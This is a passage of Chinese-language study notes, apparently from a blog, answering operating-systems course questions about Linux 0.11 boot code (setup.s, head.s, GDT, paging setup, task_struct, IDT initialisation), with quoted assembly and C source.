个扇区，加载到内存 <span class=\"number\">0x10000</span> 处</span><br><span class=\"line\">\tmov\tax,#SYSSEG。;<span class=\"number\">0x1000</span></span><br><span class=\"line\">\tmov\tes,ax\t\t! segment of <span class=\"number\">0x010000</span></span><br><span class=\"line\">\tcall\tread_it</span><br><span class=\"line\">\tcall\tkill_motor</span><br><span class=\"line\"></span><br><span class=\"line\">\tseg cs</span><br><span class=\"line\">\tmov\tax,root_dev</span><br><span class=\"line\">\tcmp\tax,#<span class=\"number\">0</span></span><br><span class=\"line\">\tjne\troot_defined</span><br><span class=\"line\">;跳转到setup.s</span><br><span class=\"line\">root_defined:</span><br><span class=\"line\">\tseg cs</span><br><span class=\"line\">\tmov\troot_dev,ax</span><br><span class=\"line\"></span><br><span class=\"line\">\tjmpi\t<span class=\"number\">0</span>,SETUPSEG; <span class=\"number\">0x9020</span> 跳转到setup.s开始继续执行了!!!</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"setup-s和head-s的衔接\"><a href=\"#setup-s和head-s的衔接\" class=\"headerlink\" title=\"setup.s和head.s的衔接\"></a>setup.s和head.s的衔接</h2><p>1.setup.s把head.s及之后的代码都移动到了内存0开始的地方(do_move)</p>\n<p>2.设置gdt、ldt(end_move)</p>\n<p>3.开保护模式, jmpi 0,8 跳转到了head.s</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov\tax,#<span class=\"number\">0x0001</span>\t! protected <span class=\"title function_\">mode</span> <span class=\"params\">(PE)</span> bit。 保护模式. PE,不是任何人都可以修改</span><br><span class=\"line\">lmsw\tax\t\t! This is it!</span><br><span class=\"line\">jmpi\t0,8\t\t! jmp offset 0 of segment 8 <span class=\"params\">(cs)</span>  gdt的1项, 0开始编号,第二项</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"5-setup程序的最后是jmpi-0-8-，为什么这个8不能简单的当作阿拉伯数字8看待，究竟有什么内涵？\"><a href=\"#5-setup程序的最后是jmpi-0-8-，为什么这个8不能简单的当作阿拉伯数字8看待，究竟有什么内涵？\" class=\"headerlink\" title=\"5.setup程序的最后是jmpi 0,8 ，为什么这个8不能简单的当作阿拉伯数字8看待，究竟有什么内涵？\"></a>5.setup程序的最后是jmpi 0,8 ，为什么这个8不能简单的当作阿拉伯数字8看待，究竟有什么内涵？</h1><p>p25</p>\n<p><a href=\"https://mp.weixin.qq.com/s/S5zarr9BmLhUHAmdmeNypA\">https://mp.weixin.qq.com/s/S5zarr9BmLhUHAmdmeNypA</a></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov ax,#<span class=\"number\">0x0001</span>  ; protected <span class=\"title function_\">mode</span> <span class=\"params\">(PE)</span> bit</span><br><span class=\"line\">lmsw ax      ; This is it;</span><br><span class=\"line\">jmpi\t<span class=\"number\">0</span>,<span class=\"number\">8</span>\t! jmp offset <span class=\"number\">0</span> of segment <span class=\"number\">8</span> (cs) gdt的<span class=\"number\">1</span>项, <span class=\"number\">0</span>开始编号,第二项</span><br></pre></td></tr></table></figure>\n\n<p>在执行这条指令前已经转变为了保护模式, 保护模式的寻址方式变了,需要通过段选择子,段寄存器中存储的不再是地址,而是段选择子</p>\n<p>0 表示段内偏移地址, 8代表cs(代码段)的值, 更具体而言,8是 0000,0000,0000,1000</p>\n<p>根据下图段选择子的结构可以看出,1是代表了描述符索引,即gdt表的第一项,也就是现在地址的0!</p>\n<p>gdt表在此之前已经初始化过,第一项是内核代码段,base address &#x3D; 0 , 偏移地址也是0,所以跳转到内存的0地址</p>\n<p><img src=\"/ucas-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%80%9D%E8%80%83%E9%A2%98%E4%B8%8A/Untitled2.png\" alt=\"Untitled2\"></p>\n<p><img src=\"/ucas-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%80%9D%E8%80%83%E9%A2%98%E4%B8%8A/Untitled3.png\" alt=\"Untitled3\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gdt:</span><br><span class=\"line\">    .word   <span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>     ; dummy</span><br><span class=\"line\"></span><br><span class=\"line\">    .word   <span class=\"number\">0x07FF</span>      ; <span class=\"number\">8</span>Mb - limit=<span class=\"number\">2047</span> (<span class=\"number\">2048</span>*<span class=\"number\">4096</span>=<span class=\"number\">8</span>Mb)</span><br><span class=\"line\">    .word   <span class=\"number\">0x0000</span>      ; base address=<span class=\"number\">0</span></span><br><span class=\"line\">    .word   <span class=\"number\">0x9A00</span>      ; code read/exec</span><br><span class=\"line\">    .word   <span class=\"number\">0x00C0</span>      ; granularity=<span class=\"number\">4096</span>, <span class=\"number\">386</span></span><br><span class=\"line\"></span><br><span class=\"line\">    .word   <span class=\"number\">0x07FF</span>      ; <span class=\"number\">8</span>Mb - limit=<span class=\"number\">2047</span> (<span class=\"number\">2048</span>*<span class=\"number\">4096</span>=<span class=\"number\">8</span>Mb)</span><br><span class=\"line\">    .word   <span class=\"number\">0x0000</span>      ; base address=<span class=\"number\">0</span></span><br><span class=\"line\">    .word   <span class=\"number\">0x9200</span>      ; data read/write</span><br><span class=\"line\">    .word   <span class=\"number\">0x00C0</span>      ; granularity=<span class=\"number\">4096</span>, <span class=\"number\">386</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"6-保护模式在“保护”什么？它的“保护”体现在哪里？特权级的目的和意义是什么？分页有“保护”作用吗？\"><a href=\"#6-保护模式在“保护”什么？它的“保护”体现在哪里？特权级的目的和意义是什么？分页有“保护”作用吗？\" class=\"headerlink\" title=\"6.保护模式在“保护”什么？它的“保护”体现在哪里？特权级的目的和意义是什么？分页有“保护”作用吗？\"></a>6.保护模式在“保护”什么？它的“保护”体现在哪里？特权级的目的和意义是什么？分页有“保护”作用吗？</h1><p>p438</p>\n<p>保护模式在保护段,通过段机制划分不同的段,设置各个段的访问权限. 增加了段限长,防止了对代码段的覆盖以及超越权限的访问</p>\n<p>特权级的目的是 阻止非法的访问, 对用户进程之间进行了隔离</p>\n<p>意义是保护了资源</p>\n<p>分页有保护作用,分页使得用户无法直接找到物理地址,用户只能操作逻辑地址,而逻辑地址需要先转化为线性地址,然后才能进一步转化为物理地址</p>\n<h1 id=\"7-在setup程序里曾经设置过gdt，为什么在head程序中将其废弃，又重新设置了一个？为什么设置两次，而不是一次搞好？\"><a href=\"#7-在setup程序里曾经设置过gdt，为什么在head程序中将其废弃，又重新设置了一个？为什么设置两次，而不是一次搞好？\" class=\"headerlink\" title=\"7.在setup程序里曾经设置过gdt，为什么在head程序中将其废弃，又重新设置了一个？为什么设置两次，而不是一次搞好？\"></a>7.在setup程序里曾经设置过gdt，为什么在head程序中将其废弃，又重新设置了一个？为什么设置两次，而不是一次搞好？</h1><p>p33</p>\n<p>因为第一次设置GDT是在setup.s里面设置的数据,setup.s将来会在设计缓冲区时被覆盖,所以需要改变位置. 其实这是设计者精心打磨内存使用空间而产生的后果,尽可能不浪费一点空间,head.s执行时,gdt又被写到了head.s执行过的程序中,实现了内存的充分利用.</p>\n<h1 id=\"8-进程0的task-struct在哪？具体内容是什么？\"><a href=\"#8-进程0的task-struct在哪？具体内容是什么？\" class=\"headerlink\" title=\"8.进程0的task_struct在哪？具体内容是什么？\"></a>8.进程0的task_struct在哪？具体内容是什么？</h1><h2 id=\"在哪\"><a href=\"#在哪\" class=\"headerlink\" title=\"在哪?\"></a>在哪?</h2><p>include&#x2F;linux&#x2F;sched.h 是写死的,在INIT_ TASK里,运行时位于内核数据区</p>\n<p>在未初始化进程0之前,使用的是boot阶段的内核栈(user_stack) 很奇怪吧,内核栈却叫user_stack,p34</p>\n<h2 id=\"具体内容\"><a href=\"#具体内容\" class=\"headerlink\" title=\"具体内容?\"></a>具体内容?</h2><p>包含了进程各项初始化的内容,具体的话可以看task_struct,附在下面了. (include&#x2F;linux&#x2F;sched.h )</p>\n<p>如:进程0的进程状态,LDT,TSS等 p68</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> *  INIT_TASK is used to set up the first task table, touch at</span></span><br><span class=\"line\"><span class=\"comment\"> * your own risk!. Base=0, limit=0x9ffff (=640kB)</span></span><br><span class=\"line\"><span class=\"comment\"> */</span>         <span class=\"comment\">// 下面的就是进程0的各个参数的具体值</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> INIT_TASK \\</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"comment\">/* state etc */</span>\t&#123; 0,15,15, \\   <span class=\"comment\">// 0是说可以跑,而不是正在跑 </span></span></span><br><span class=\"line\"><span class=\"comment\">/* signals */</span>\t<span class=\"number\">0</span>,&#123;&#123;&#125;,&#125;,<span class=\"number\">0</span>, \\</span><br><span class=\"line\"><span class=\"comment\">/* ec,brk... */</span>\t<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>, \\</span><br><span class=\"line\"><span class=\"comment\">/* pid etc.. */</span>\t<span class=\"number\">0</span>,<span class=\"number\">-1</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>, \\</span><br><span class=\"line\"><span class=\"comment\">/* uid etc */</span>\t<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>, \\</span><br><span class=\"line\"><span class=\"comment\">/* alarm */</span>\t<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>, \\</span><br><span class=\"line\"><span class=\"comment\">/* math */</span>\t<span class=\"number\">0</span>, \\</span><br><span class=\"line\"><span class=\"comment\">/* fs info */</span>\t<span class=\"number\">-1</span>,<span class=\"number\">0022</span>,<span class=\"literal\">NULL</span>,<span class=\"literal\">NULL</span>,<span class=\"literal\">NULL</span>,<span class=\"number\">0</span>, \\</span><br><span class=\"line\"><span class=\"comment\">/* filp */</span>\t&#123;<span class=\"literal\">NULL</span>,&#125;, \\</span><br><span class=\"line\">\t&#123; \\</span><br><span class=\"line\">\t\t&#123;<span class=\"number\">0</span>,<span class=\"number\">0</span>&#125;, \\</span><br><span class=\"line\"><span class=\"comment\">/* ldt */</span>\t&#123;<span class=\"number\">0x9f</span>,<span class=\"number\">0xc0fa00</span>&#125;, \\</span><br><span class=\"line\">\t\t&#123;<span class=\"number\">0x9f</span>,<span class=\"number\">0xc0f200</span>&#125;, \\</span><br><span class=\"line\">\t&#125;, \\</span><br><span class=\"line\"><span class=\"comment\">/*tss*/</span>\t&#123;<span class=\"number\">0</span>,PAGE_SIZE+(<span class=\"type\">long</span>)&amp;init_task,<span class=\"number\">0x10</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,(<span class=\"type\">long</span>)&amp;pg_dir,\\</span><br><span class=\"line\">\t <span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>, \\</span><br><span class=\"line\">\t <span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0x17</span>,<span class=\"number\">0x17</span>,<span class=\"number\">0x17</span>,<span class=\"number\">0x17</span>,<span class=\"number\">0x17</span>,<span class=\"number\">0x17</span>, \\</span><br><span class=\"line\">\t _LDT(<span class=\"number\">0</span>),<span class=\"number\">0x80000000</span>, \\</span><br><span class=\"line\">\t\t&#123;&#125; \\</span><br><span class=\"line\">\t&#125;, \\</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">task_struct</span> &#123;</span>          <span class=\"comment\">// 非常非常非常重要,操作系统里最核心的东西</span></span><br><span class=\"line\"><span class=\"comment\">/* these are hardcoded - don&#x27;t touch */</span></span><br><span class=\"line\">\t<span class=\"type\">long</span> state;\t<span class=\"comment\">/* -1 unrunnable, 0 runnable, &gt;0 stopped */</span> <span class=\"comment\">//状态</span></span><br><span class=\"line\">\t<span class=\"type\">long</span> counter;  <span class=\"comment\">//时间片 </span></span><br><span class=\"line\">\t<span class=\"type\">long</span> priority;</span><br><span class=\"line\">\t<span class=\"type\">long</span> signal;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sigaction</span> <span class=\"title\">sigaction</span>[32];</span></span><br><span class=\"line\">\t<span class=\"type\">long</span> blocked;\t<span class=\"comment\">/* bitmap of masked signals */</span></span><br><span class=\"line\"><span class=\"comment\">/* various fields */</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> exit_code;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> start_code,end_code,end_data,brk,start_stack;  <span class=\"comment\">//malloc从这里划</span></span><br><span class=\"line\">\t<span class=\"type\">long</span> pid,father,pgrp,session,leader;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">short</span> uid,euid,suid;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">short</span> gid,egid,sgid;</span><br><span class=\"line\">\t<span class=\"type\">long</span> alarm;</span><br><span class=\"line\">\t<span class=\"type\">long</span> utime,stime,cutime,cstime,start_time;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">short</span> used_math;</span><br><span class=\"line\"><span class=\"comment\">/* file system info */</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> tty;\t\t<span class=\"comment\">/* -1 if no tty, so it must be signed */</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">short</span> umask;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">m_inode</span> * <span class=\"title\">pwd</span>;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">m_inode</span> * <span class=\"title\">root</span>;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">m_inode</span> * <span class=\"title\">executable</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> close_on_exec;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">file</span> * <span class=\"title\">filp</span>[<span class=\"title\">NR_OPEN</span>];</span></span><br><span class=\"line\"><span class=\"comment\">/* ldt for this task 0 - zero 1 - cs 2 - ds&amp;ss */</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">desc_struct</span> <span class=\"title\">ldt</span>[3];</span></span><br><span class=\"line\"><span class=\"comment\">/* tss for this task */</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tss_struct</span> <span class=\"title\">tss</span>;</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"9-内核的线性地址空间是如何分页的？画出从0x000000开始的7个页（包括页目录表、页表所在页）的挂接关系图，就是页目录表的前四个页目录项、第一个页表的前7个页表项指向什么位置？给出代码证据。\"><a href=\"#9-内核的线性地址空间是如何分页的？画出从0x000000开始的7个页（包括页目录表、页表所在页）的挂接关系图，就是页目录表的前四个页目录项、第一个页表的前7个页表项指向什么位置？给出代码证据。\" class=\"headerlink\" title=\"9.内核的线性地址空间是如何分页的？画出从0x000000开始的7个页（包括页目录表、页表所在页）的挂接关系图，就是页目录表的前四个页目录项、第一个页表的前7个页表项指向什么位置？给出代码证据。\"></a>9.内核的线性地址空间是如何分页的？画出从0x000000开始的7个页（包括页目录表、页表所在页）的挂接关系图，就是页目录表的前四个页目录项、第一个页表的前7个页表项指向什么位置？给出代码证据。</h1><p>p37 </p>\n<p>赵炯p438</p>\n<p>注意是线性地址空间,线性地址空间远大于物理地址空间,线性地址空间是 64k * 64k &#x3D; 4G。 0xFFFFFF 2的32次方</p>\n<h2 id=\"分页\"><a href=\"#分页\" class=\"headerlink\" title=\"分页\"></a>分页</h2><p>4k大小为一页</p>\n<p>setup_paging开始</p>\n<p>第一页是页目录表,随后的4个页表是内核专属的页表</p>\n<p>分别代表什么呢? 第一个是不是gdt?? gdt在哪??</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">head.s</span><br><span class=\"line\"></span><br><span class=\"line\">.align <span class=\"number\">2</span></span><br><span class=\"line\">setup_paging:</span><br><span class=\"line\">\tmovl $<span class=\"number\">1024</span>*<span class=\"number\">5</span>,%ecx\t\t<span class=\"comment\">/* 5 pages - pg_dir+4 page tables */</span></span><br><span class=\"line\">\txorl %eax,%eax</span><br><span class=\"line\">\txorl %edi,%edi\t\t\t<span class=\"comment\">/* pg_dir is at 0x000 */</span></span><br><span class=\"line\">\tcld;rep;stosl</span><br><span class=\"line\">\tmovl $pg0+<span class=\"number\">7</span>,_pg_dir\t\t<span class=\"comment\">/* set present bit/user r/w  111 */</span>   ;<span class=\"number\">111</span> 已分页  三特权? 可读写</span><br><span class=\"line\">\tmovl $pg1+<span class=\"number\">7</span>,_pg_dir+<span class=\"number\">4</span>\t\t<span class=\"comment\">/*  --------- &quot; &quot; ---------\t\t\t\t */</span></span><br><span class=\"line\">\tmovl $pg2+<span class=\"number\">7</span>,_pg_dir+<span class=\"number\">8</span>\t\t<span class=\"comment\">/*  --------- &quot; &quot; --------- */</span></span><br><span class=\"line\">\tmovl $pg3+<span class=\"number\">7</span>,_pg_dir+<span class=\"number\">12</span>\t\t<span class=\"comment\">/*  --------- &quot; &quot; --------- */</span></span><br><span class=\"line\">\tmovl $pg3+<span class=\"number\">4092</span>,%edi</span><br><span class=\"line\">\tmovl $<span class=\"number\">0xfff007</span>,%eax\t\t<span class=\"comment\">/*  16Mb - 4096 + 7 (r/w user,p) */</span></span><br><span class=\"line\">\t<span class=\"built_in\">std</span></span><br><span class=\"line\"><span class=\"number\">1</span>:\tstosl\t\t\t<span class=\"comment\">/* fill pages backwards - more efficient :-) */</span></span><br><span class=\"line\">\tsubl $<span class=\"number\">0x1000</span>,%eax</span><br><span class=\"line\">\tjge <span class=\"number\">1b</span></span><br><span class=\"line\">\txorl %eax,%eax\t\t<span class=\"comment\">/* pg_dir is at 0x0000 */</span></span><br><span class=\"line\">\tmovl %eax,%cr3\t\t<span class=\"comment\">/* cr3 - page directory start 恒等映射 物理 = 线性*/</span></span><br><span class=\"line\">\tmovl %cr0,%eax</span><br><span class=\"line\">\torl $<span class=\"number\">0x80000000</span>,%eax <span class=\"comment\">/*打开分页*/</span></span><br><span class=\"line\">\tmovl %eax,%cr0\t\t<span class=\"comment\">/* set paging (PG) bit */</span></span><br><span class=\"line\">\tret\t\t\t<span class=\"comment\">/* this also flushes prefetch-queue */</span></span><br><span class=\"line\">\t\t\t\t ; 切换到main函数</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"页目录表、页表、页\"><a href=\"#页目录表、页表、页\" class=\"headerlink\" title=\"页目录表、页表、页\"></a>页目录表、页表、页</h2><p>一个页目录表项是4byte,也就是32位,通过它来寻址一个页表, 页目录表一共4* 1024 &#x3D; 4k大小</p>\n<p>一个页表也是4byte,每一个页表有1024个页表项,也是 4k 占用一页</p>\n<p><img src=\"/ucas-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%80%9D%E8%80%83%E9%A2%98%E4%B8%8A/Untitled4.png\" alt=\"Untitled4\"></p>\n<h2 id=\"开始的前7个页是什么意思呢\"><a href=\"#开始的前7个页是什么意思呢\" class=\"headerlink\" title=\"开始的前7个页是什么意思呢?\"></a>开始的前7个页是什么意思呢?</h2><p>p39</p>\n<p>也就是前7个4k, 第一个4k是页目录表,第2~7个4k是第一个页表的</p>\n<p>赵炯p78</p>\n<p><img src=\"/ucas-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%80%9D%E8%80%83%E9%A2%98%E4%B8%8A/Untitled5.png\" alt=\"Untitled4\"></p>\n<h2 id=\"挂接关系图p39\"><a href=\"#挂接关系图p39\" class=\"headerlink\" title=\"挂接关系图p39\"></a>挂接关系图p39</h2><p><img src=\"/ucas-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%80%9D%E8%80%83%E9%A2%98%E4%B8%8A/Untitled6.png\" alt=\"Untitled6\"></p>\n<h1 id=\"10-在head程序执行结束的时候，在idt的前面有184个字节的head程序的剩余代码，剩余了什么？为什么要剩余？\"><a href=\"#10-在head程序执行结束的时候，在idt的前面有184个字节的head程序的剩余代码，剩余了什么？为什么要剩余？\" class=\"headerlink\" title=\"10.在head程序执行结束的时候，在idt的前面有184个字节的head程序的剩余代码，剩余了什么？为什么要剩余？\"></a>10.在head程序执行结束的时候，在idt的前面有184个字节的head程序的剩余代码，剩余了什么？为什么要剩余？</h1><h1 id=\"11-为什么不用call，而是用ret“调用”main函数？画出调用路线图，给出代码证据。\"><a href=\"#11-为什么不用call，而是用ret“调用”main函数？画出调用路线图，给出代码证据。\" class=\"headerlink\" title=\"11.为什么不用call，而是用ret“调用”main函数？画出调用路线图，给出代码证据。\"></a>11.为什么不用call，而是用ret“调用”main函数？画出调用路线图，给出代码证据。</h1><p><a href=\"https://mp.weixin.qq.com/s/ISyaX5zPWRw_d-9zvZUPUg\">https://mp.weixin.qq.com/s/ISyaX5zPWRw_d-9zvZUPUg</a></p>\n<p>因为main函数是整个系统的运行函数,它不能被call,没有比它等级更高的,call的话是需要返回的,main不需要返回,main结束了,就关机了(</p>\n<p>正常函数调用是会把eip(被掉函数返回时 返回的地址) 进行压栈, ret的时候取出来,进入到这里继续执行,main不能被调用,但可以伪造被调用的假象,然后也进行ret,就可以进入到main里了</p>\n<h2 id=\"调用路线图-p42\"><a href=\"#调用路线图-p42\" class=\"headerlink\" title=\"调用路线图 p42\"></a>调用路线图 p42</h2><p>正常的call</p>\n<p><img src=\"/ucas-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%80%9D%E8%80%83%E9%A2%98%E4%B8%8A/Untitled7.png\" alt=\"Untitled7\"></p>\n<p>模仿的call</p>\n<p><img src=\"/ucas-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%80%9D%E8%80%83%E9%A2%98%E4%B8%8A/Untitled8.png\" alt=\"Untitled8\"></p>\n<h2 id=\"代码head-s\"><a href=\"#代码head-s\" class=\"headerlink\" title=\"代码head.s\"></a>代码head.s</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">startup_32:</span><br><span class=\"line\">\tjmp after_page_tables</span><br><span class=\"line\"></span><br><span class=\"line\">after_page_tables:</span><br><span class=\"line\">\tpushl $<span class=\"number\">0</span>\t\t# These are the parameters to main :-)</span><br><span class=\"line\">\tpushl $<span class=\"number\">0</span></span><br><span class=\"line\">\tpushl $<span class=\"number\">0</span></span><br><span class=\"line\">\tpushl $L6\t\t<span class=\"meta\"># return address for main, <span class=\"keyword\">if</span> it decides to.</span></span><br><span class=\"line\">\tpushl $_main    ; 后面把这个pop出来</span><br><span class=\"line\">\tjmp setup_paging</span><br><span class=\"line\"></span><br><span class=\"line\">setup_paging:</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    ret ;回到main函数</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/ucas-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%80%9D%E8%80%83%E9%A2%98%E4%B8%8A/Untitled9.png\" alt=\"Untitled9\"></p>\n<h1 id=\"12-用文字和图说明中断描述符表是如何初始化的，可以举例说明（比如：set-trap-gate-0-amp-divide-error-），并给出代码证据。\"><a href=\"#12-用文字和图说明中断描述符表是如何初始化的，可以举例说明（比如：set-trap-gate-0-amp-divide-error-），并给出代码证据。\" class=\"headerlink\" title=\"12.用文字和图说明中断描述符表是如何初始化的，可以举例说明（比如：set_trap_gate(0,&amp;divide_error)），并给出代码证据。\"></a>12.用文字和图说明中断描述符表是如何初始化的，可以举例说明（比如：set_trap_gate(0,&amp;divide_error)），并给出代码证据。</h1><p>p53页</p>\n<p>&#x2F;init&#x2F;main.c trap_init();</p>\n<p>&#x2F;kernel&#x2F;trap.c  trap_init()</p>\n<p>&#x2F;include&#x2F;asm&#x2F;system.h </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//设置中断门函数</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> set_intr_gate(n,addr) \\  <span class=\"comment\">// n 中断号 addr 中断程序偏移地址</span></span></span><br><span class=\"line\">\t_set_gate(&amp;idt[n],<span class=\"number\">14</span>,<span class=\"number\">0</span>,addr)  <span class=\"comment\">//&amp;idt[n]对应中断号在中断描述符表中的偏移值；中断描述符的类型是 14，特权级是 0。</span></span><br><span class=\"line\"><span class=\"comment\">//设置陷阱门函数</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> set_trap_gate(n,addr) \\</span></span><br><span class=\"line\"><span class=\"meta\">\t_set_gate(&amp;idt[n],15,0,addr) <span class=\"comment\">// idt表的n项,f,0, 0对应dpl,15对应type ,以二进制来看到</span></span></span><br><span class=\"line\"><span 